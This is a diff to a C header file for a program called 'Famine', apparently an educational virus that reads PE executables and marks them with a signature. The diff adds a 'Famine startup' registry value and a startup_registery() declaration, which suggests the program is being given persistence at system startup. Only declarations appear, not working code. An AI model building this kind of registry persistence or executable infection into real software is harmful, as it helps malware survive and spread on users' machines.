@@ -40,6 +40,8 @@
 # define PE_SIGNATURE		"4550" // soit "PE\0\0"
 # define ARCHITECTURE_64	"20b" // 64b hex
 # define SIGNATURE 			"frmarinh-jguyet"
+# define STARTUP_VALUE		"Famine startup"
+# define ARGS_STARTUP		" %DEBUG"
 
 typedef __int32				int32_t;
 typedef unsigned __int32	uint32_t;
@@ -208,6 +210,9 @@ typedef struct		s_famine
 {
 	char			*path;
 	bool			debug;
+	char			*executable_path;
+	char			*buffer;
+	int				buffer_len;
 }					t_famine;
 
 /*
@@ -248,4 +253,9 @@ struct stat			*check_access_file(char *file, t_famine *famine);
 **	READ PE
 */
 t_pe				*pe(t_famine *famine, char *folder_path, char *file_name);
+
+/*
+**	REGISTERY
+*/
+void				startup_registery(t_famine *famine);
 #endif
